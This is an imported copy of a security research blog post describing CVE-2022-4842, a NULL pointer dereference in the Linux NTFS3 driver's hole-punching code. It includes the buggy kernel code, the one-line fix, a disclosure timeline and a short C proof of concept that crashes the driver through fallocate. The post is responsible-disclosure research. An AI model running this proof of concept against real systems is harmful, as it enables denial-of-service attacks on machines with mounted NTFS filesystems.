---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-07_the-linux-kernel-and-the-cursed-driver.md
original_filename: 2023-02-07_the-linux-kernel-and-the-cursed-driver.md
title: The Linux Kernel and the Cursed Driver
category: documents
detected_topics:
- sso
- command-injection
- api-security
tags:
- imported
- documents
- sso
- command-injection
- api-security
language: en
raw_sha256: a469cbfdda2b1558e1ff02999ce9ad0f5884c27f25bfb08efe5fda6c87cdf181
text_sha256: 70459ebee4866a998e75a55c01f817dda5070518a624183e2d5a9a4df2bbf712
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# The Linux Kernel and the Cursed Driver

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-07_the-linux-kernel-and-the-cursed-driver.md
- Source Type: markdown
- Detected Topics: sso, command-injection, api-security
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `a469cbfdda2b1558e1ff02999ce9ad0f5884c27f25bfb08efe5fda6c87cdf181`
- Text SHA256: `70459ebee4866a998e75a55c01f817dda5070518a624183e2d5a9a4df2bbf712`


## Content

---
title: "The Linux Kernel and the Cursed Driver"
url: "https://www.cyberark.com/resources/threat-research-blog/the-linux-kernel-and-the-cursed-driver"
final_url: "https://www.cyberark.com/resources/threat-research-blog/the-linux-kernel-and-the-cursed-driver"
authors: ["Alon Zahavi (@Alon_Z4)"]
programs: ["Linux Kernel Organization"]
bugs: ["Kernel hacking", "NULL pointer dereference"]
publication_date: "2023-02-07"
added_date: "2023-02-13"
source: "pentester.land/writeups.json"
original_index: 1568
---

# The Linux Kernel and the Cursed Driver

February 7, 2023 Alon Zahavi

  * Share this Article
  * [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fthe-linux-kernel-and-the-cursed-driver)
  * [Twitter](https://twitter.com/share?text=The%20Linux%20Kernel%20and%20the%20Cursed%20Driver&url=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fthe-linux-kernel-and-the-cursed-driver&via=CyberArk)
  * [Email](/cdn-cgi/l/email-protection#d6e9a5a3b4bcb3b5a2eb95b9b8a2b3b8a2f3e4e6b0a4b9bbf3e4e6bbaff3e4e69ea3b4f3e4e7f0b7bba6edb4b9b2afeb95beb3b5bdf3e4e6b9a3a2f3e4e6a1beb7a2f3e4e1a5f3e4e6beb7a6a6b3b8bfb8b1f3e4e6b7a2f3e4e695afb4b3a497a4bdf3e4e7f3e697f3e69782beb3f3e4e69abfb8a3aef3e4e69db3a4b8b3baf3e4e6b7b8b2f3e4e6a2beb3f3e4e695a3a4a5b3b2f3e4e692a4bfa0b3a4f3e6979fb8a2a4b9b2a3b5a2bfb9b8f3e4e698829085f3e4e6bfa5f3e4e6b7f3e4e6b0bfbab3a5afa5a2b3bbf3e4e6b2b3a0b3bab9a6b3b2f3e4e6b4aff3e4e69bbfb5a4b9a5b9b0a2f3e4e6a2beb7a2f3e4e6a1b7a5f3e4e6bfb8a2a4b9b2a3b5b3b2f3e4e6bfb8f3e4e6e7efefe5f8f3e4e685bfb8b5b3f3e4e6a2beb3b8f3e495f3e4e6bfa2f3e4e6beb7a5f3e4e6b4b3b5b9bbb3f3e4e6a2beb3f3e4e6a6a4bfbbb7a4aff3e4e6b0bfbab3a5afa5a2b3bbf3e4e6b0b9a4f3e4e681bfb8b2b9a1a5f8f3e4e69fb8f3e4e6a4b3b5b3b8a2f3e4e6afb3b7a4a5f3e495f3e4e6a2beb3f3e4e6b8b3b3b2f3e4e6b0b9a4f3e4e6b7b8f3e4e698829085f8f8f8f3e697f3e697bea2a2a6a5f3e597f3e490f3e490a1a1a1f8b5afb4b3a4b7a4bdf8b5b9bbf3e490a4b3a5b9a3a4b5b3a5f3e490a2bea4b3b7a2fba4b3a5b3b7a4b5befbb4bab9b1f3e490a2beb3fbbabfb8a3aefbbdb3a4b8b3bafbb7b8b2fba2beb3fbb5a3a4a5b3b2fbb2a4bfa0b3a4)
  * [LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.cyberark.com%2Fresources%2Fthreat-research-blog%2Fthe-linux-kernel-and-the-cursed-driver&title=The%20Linux%20Kernel%20and%20the%20Cursed%20Driver&summary=Introduction%20NTFS%20is%20a%20filesystem%20developed%20by%20Microsoft%20that%20was%20introduced%20in%201993.%20Since%20then%2C%20it%20has%20become%20the%20primary%20filesystem%20for%20Windows.%20In%20recent%20years%2C%20the%20need%20for%20an%20NTFS...)

![](https://www.cyberark.com/wp-content/uploads/2023/02/linux-kernel-hero.png)

### Introduction

NTFS is a filesystem developed by Microsoft that was introduced in 1993. Since then, it has become the primary filesystem for Windows. In recent years, the need for an NTFS implementation for macOS and Linux has risen, and as a result, new NTFS drivers for those operating systems have been developed.

This blog post presents some information about the NTFS driver for Linux and shows a bug we found in one of the filesystem’s features.

### TL;DR

We found a bug in the not-so-well-maintained NTFS3 driver in Linux. Abusing the vulnerability could lead to a denial-of-service (DoS) attack on machines with a mounted NTFS filesystem.

### Brief History of Linux’s NTFS3 Driver

In Linux version 5.15, the new NTFS3 [[1]](https://www.kernel.org/doc/html/latest/filesystems/ntfs3.html) driver was introduced to the community by Paragon Software as a solution for those who wanted to use the filesystem outside of Microsoft Windows.

The driver offers full read-write access to any NTFS image up to NTFS version 3.1. One of the features of this driver is the ability to use sparse files and compressed files, which will be discussed later on. Moreover, by using this driver, one can add **extended attributes** to the NTFS files and control some other NTFS features.

However, the majority of the driver’s source code is not documented. Thus, it is hard to keep track of the driver’s features and how to use them. Most of the information you will find here is taken from researching the source code and some NTFS documentation from Microsoft [[2]](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa364407\(v=vs.85\)) and Tuxera’s NTFS-3G [[3]](https://www.kernel.org/doc/html/latest/filesystems/ntfs3.html) [[4]](https://github.com/tuxera/ntfs-3g) – FUSE (userspace filesystem framework) NTFS3 support in Linux.

### Linux Developers’ Concerns About NTFS

The driver was introduced to the mainline kernel in Linux v5.15. Two years after, one of the developers who contributed to the driver sent an email to the ntfs3 mailing list (dedicated mailing list for NTFS3 driver issues) and Linus Torvalds, stating that he thought that the driver should be considered an orphan (part of the kernel with no active maintainer) because the maintainers weren’t handling the maintenance of the driver properly [[5]](https://lore.kernel.org/lkml/da20d32b-5185-f40b-48b8-2986922d8b25@stargateuniverse.net/T/#r645fe02d6d06ae617a133620e768eaddd45305ce).

### What Is Our Quest?

Everyone makes mistakes, especially when it comes to coding. Most of the time, when a codebase is maintained regularly, as happens in most of Linux’s subsystems, there are a significant number of people looking at the code on a regular basis and fixing bugs. When talking about a niche filesystem in Linux like NTFS, however, fewer people are looking into the code, and fewer users encounter bugs. Therefore, the chance of a bug being found and fixed is reduced.

### Sparse Files

Let’s head straight to one of the driver’s features: support for sparse files. A sparse file is a file that is saved on the disk in a way that should consume disk space more efficiently. For example, one can save a 4GB file and mark a space of 3GB from that file as sparse. By doing so, the file will only take 1GB of disk space, and if new data is saved to the file, space will be allocated from the space previously considered sparse.

A good example of a sparse file is VMWare’s VMDK (Virtual Machine Disk). When creating a new virtual machine, the disk is created as a sparse file, meaning the user can ask for a 300GB virtual disk, but until all of the 300GB is in actual use (and not zeroed-out spaces), the VMDK file on the host will only take a fraction of this space.

We won’t get into all the details (if you want to, here are some links [[6]](https://wiki.archlinux.org/title/sparse_file)[ [7]](https://ntfs.com/ntfs-sparse.htm)). Instead, we will focus on the NTFS3 driver implementation of a method called punch_hole, which is responsible for deallocating space from a sparse file for later use.

### NTFS File Attributes

An NTFS file is just a combination of file attributes put together in a particular way. When reading a file, the NTFS driver will search for the desired attributes and parse the data to show the user the requested information. For example, one of the attributes can be the “File Name.” Another attribute will be the “Data,” where the file’s actual data is stored.

A file can have more than one “Data” attribute. One example of this is sparse files. Sparse files hold few “Data” attributes. In that case, some “Data” attributes will hold the default file’s data, while other “Data” attributes hold information about the sparse spaces in the file.

### Resident and Non Resident Attributes

There are two kinds of attributes in NTFS, **resident attributes** and non-resident attributes. An attribute is considered resident if it can fit in the MFT table [[8]](https://learn.microsoft.com/en-us/windows/win32/fileio/master-file-table), which is a table that holds information on the NTFS entries on a disk. If it cannot, the attribute is considered non-resident.

## The Juicy Part (aka The Bug)

### Punching a Hole in an NTFS File

To use a sparse file on an NTFS filesystem in Linux, one should use the system called fallocate to punch a hole (zeroing partial filesystem blocks and removing whole filesystem blocks from a file, thus creating extra space on a disk) in the file, and as a result, deallocate n bytes from a specific offset in the file.

### Linux VFS and NTFS Implementation

To implement a **punch hole** feature in a filesystem, a driver should be implementing a struct file_operations, in which there should be a function pointer pointing to a custom fallocate function implementation. When a call to fallocate is initiated, the kernel will call the function pointed by the .fallocate member of the struct that has to be part of the file’s inode for it to work.

The NTFS driver uses this struct type as the variable ntfs_file_operations, and there, the .fallocate member points to the function called ntfs_fallocate, which executes to the main flow of the NTFS fallocate implementation.
  
  
  static long ntfs_fallocate(struct file *file, int mode, loff_t vbo, loff_t len)
  {
  ...
  
  bool is_supported_holes = is_sparsed(ni) || is_compressed(ni);
  
  ...
  
  /*
  * vfs_fallocate checks all possible combinations of mode.
  * Do additional checks here before ntfs_set_state(dirty).
  */
  if (mode & FALLOC_FL_PUNCH_HOLE) {
  if (!is_supported_holes)
  return -EOPNOTSUPP;
  
  
  

**Code Block 1: ntfs_fallocate – linux/fs/ntfs3/file.c**

In the snippet above, we can see that NTFS accepts punching holes if the file to be punched is a sparse file or a compressed file.
  
  
  if (mode & FALLOC_FL_PUNCH_HOLE) {
  
  struct ntfs_inode *ni = ntfs_i(inode);
  
  ...
  
  ni_lock(ni);
  err = attr_punch_hole(ni, vbo, len, &frame_size);
  ni_unlock(ni);
  
  

**Code Block 2: ntfs_fallocate – linux/fs/ntfs3/file.c**

After additional tests (which are not included here), there is a call to the function attr_punch_hole. Some attributes are deallocated in that function, depending on the user’s request.
  
  
  int attr_punch_hole(struct ntfs_inode *ni, u64 vbo, u64 bytes, u32 *frame_size)
  {
  struct ATTRIB *attr = NULL, *attr_b;
  
  ...
  
  attr_b = ni_find_attr(ni, NULL, &le_b, ATTR_DATA, NULL, 0, NULL, &mi_b);
  if (!attr_b)
  return -ENOENT;
  
  if (!attr_b->non_res) {
  u32 data_size = le32_to_cpu(attr->res.data_size);
  
  

**Code Block 3: attr_punch_hole – linux/fs/ntfs3/attrib.c**

Let’s break down how attr_punch_hole works:

  1. It declares two variables to be used later on. The first is attr, which is set as NULL. The second is attr_b.
  2. Afterward, a call to ni_find_attr retrieves an attribute of the NTFS inode (ni).
  3. If attr_b is not NULL, hence a valid attribute, the function checks whether the attribute is resident.
  4. If so, it stores the value of attr->res.data_size in the local variable data_size.

Let’s do a quick recap of what we just saw. But instead of a regular recap, we’ll use only the names of the variables the function uses in this snippet.

  1. attr is NULL.
  2. attr_b stores an attribute from type struct ATTRIB.
  3. A check is performed on attr_b.
  4. The function uses attr to determine data_size.

!["Despicable Me" \(Universal Pictures, 2010\).](https://www.cyberark.com/wp-content/uploads/2023/02/groo-meme.png)

### A Typo or Not a Typo – That Is the Question

At first, we thought we might have made a mistake or missed something between the declaration and the dereferencing. But we quickly realized that was a **typo** that should not have been there.

Copying code from one codebase to another is a common practice among developers. So, we scouted the codebase and searched for similar code to see whether it was a typo and a NULL pointer dereference or we missed something.

Also, in the same file, in another function (attr_insert_range), we found the following code:
  
  
  if (!attr_b->non_res) {
  data_size = le32_to_cpu(attr_b->res.data_size);
  
  

**Code Block 4: attr_punch_hole – linux/fs/ntfs3/attrib.c**

We can see now that in a different function, in the same file, there is a line of code that is almost identical to the buggy code we found before. The only difference is that here, to determine the data size, the function dereferences attr_b after a check is made to the same attr_b.

At that point, we figured there was a typo in attr_punc_hole that might cause a NULL pointer dereference, and we could trigger it by calling fallocate with a request to punch a hole in an NTFS file.

### Proof of Concept

Now, after we understood the bug, all we had to do was trigger it to crash the driver. To do so, we compiled a very simple program to open a file and punch a hole into it.
  
  
  #include <stdlib.h>
  #include <stdio.h>
  #include <fcntl.h>
  
  int main(int argc, char **argv) {
  
  int fd = open(argv[1], O_RDWR);
  
  if (!fd) {
  printf("fd error\n");
  exit(-1);
  }
  
  if(fallocate(fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 30, 5) < 0) {
  printf("falloc error\n");
  exit(-1);
  }
  
  return 0;
  }
  
  

**Code Block 5: PoC code**

And that is it. Running the program above on a sparse file saved on an NTFS filesystem will trigger the NULL pointer dereference and should raise an “oops” (read more here [[9]](https://static.lwn.net/images/pdf/LDD3/ch04.pdf)), thus crashing the driver.

![one-punch-man](https://www.cyberark.com/wp-content/uploads/2023/02/one-punch-man.png)

### It Should Have Worked, Right?

When running this program on a file saved on an NTFS filesystem, it will not work every time because the file has to be compressed or a sparse file (see previous sections). For the sake of the PoC, we had to create such files to validate our hypothesis. Thus, we marked the mountpoint directory for compression by setting the extended attribute system.ntfs_attrib with the flag FILE_ATTRIBUTE_COMPRESSED [[10](https://github-wiki-see.page/m/tuxera/ntfs-3g/wiki/Using-Extended-Attributes#ntfs-attributes)].

Now, every new file will be created as a compressed file, and we will be able to punch a hole inside it.

### Oopsy Daisy

After using the technique from the section above, we can rerun the program on a compressed file to get our desired oops.

We can see that RIP holds a value to attr_punch_hole with an additional offset. In other words, it confirms that we got our oops after triggering the NULL-pointer-dereference we found.

![oops](https://www.cyberark.com/wp-content/uploads/2023/02/oops.png)

**Crash Dump After Triggering The Bug**

### An Oops, Not Panic

It is worth mentioning that this bug causes an oops and not a full system crash (a.k.a. panic). That is because most distributions of Linux today come out of the box with the option “panic on oops” being disabled.

In some cases, system administrators choose to enable this feature. In those cases, triggering such a bug will automatically trigger a panic and will crash the whole system. Still, this kind of crash causes the driver to be almost useless in most cases, with restart as the only way to reload a fully working driver.

### The Fix

This section will be the shortest part of the blog, as the fix is only to add _b after attr.

  * From u32 data_size = le32_to_cpu(**attr** ->res.data_size);
  * To u32 data_size = le32_to_cpu(**attr_b** ->res.data_size);

You can view the fix commit here: <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/fs/ntfs3/attrib.c?id=6d5c9e79b726cc473d40e9cb60976dbe8e6696>

### Conclusion

Although this is a straightforward error that happens every time a user wants to punch a hole in a file, this bug was part of the Linux kernel for over a year. That is a result of code that was not maintained as expected, with the addition of NTFS being a niche filesystem among most Linux users. Yet an attacker could have caused a DoS attack on a Linux server running with an NTFS filesystem.

### Timeline

• August 15, 2022 – A fix patch was sent to the maintainer [[11]](https://lore.kernel.org/ntfs3/784f82c4-de71-b8c3-afd6-468869a369af@paragon-software.com/T/#t).  
• September 30, 2022 – The maintainer of NTFS responded and applied the patch [[11]](https://lore.kernel.org/ntfs3/784f82c4-de71-b8c3-afd6-468869a369af@paragon-software.com/T/#t).  
• December 21, 2022 – The fix was merged into the Linux kernel [[12]](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/fs/ntfs3/attrib.c?id=6d5c9e79b726cc473d40e9cb60976dbe8e6696).  
• December 29, 2022 – Assigned CVE-2022-4842 [[13]](https://access.redhat.com/security/cve/cve-2022-4842).

Special thanks for my colleague Tal Lossos who helped me with this research.

### References

[1] – <https://www.kernel.org/doc/html/latest/filesystems/ntfs3.html>  
[2] – <https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa364407(v=vs.85)>  
[3] – <https://www.tuxera.com/company/open-source/>  
[4] – <https://github.com/tuxera/ntfs-3g>  
[5] – [https://lore.kernel.org/lkml/[email protected]/T/#r645fe02d6d06ae617a133620e768eaddd45305ce](https://lore.kernel.org/lkml/da20d32b-5185-f40b-48b8-2986922d8b25@stargateuniverse.net/T/#r645fe02d6d06ae617a133620e768eaddd45305ce)  
[6] – <https://wiki.archlinux.org/title/sparse_file>  
[7] – <https://ntfs.com/ntfs-sparse.htm>  
[8] – <https://learn.microsoft.com/en-us/windows/win32/fileio/master-file-table>  
[9] – <https://static.lwn.net/images/pdf/LDD3/ch04.pdf>  
[10] –[ https://github-wiki-see.page/m/tuxera/ntfs-3g/wiki/Using-Extended-Attributes#ntfs-attributes](https://github-wiki-see.page/m/tuxera/ntfs-3g/wiki/Using-Extended-Attributes#ntfs-attributes)  
[11] – [https://lore.kernel.org/ntfs3/[email protected]/T/#t](https://lore.kernel.org/ntfs3/784f82c4-de71-b8c3-afd6-468869a369af@paragon-software.com/T/#t)  
[12] – <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/fs/ntfs3/attrib.c?id=6d5c9e79b726cc473d40e9cb60976dbe8e6696>  
[13] – <https://access.redhat.com/security/cve/cve-2022-4842>
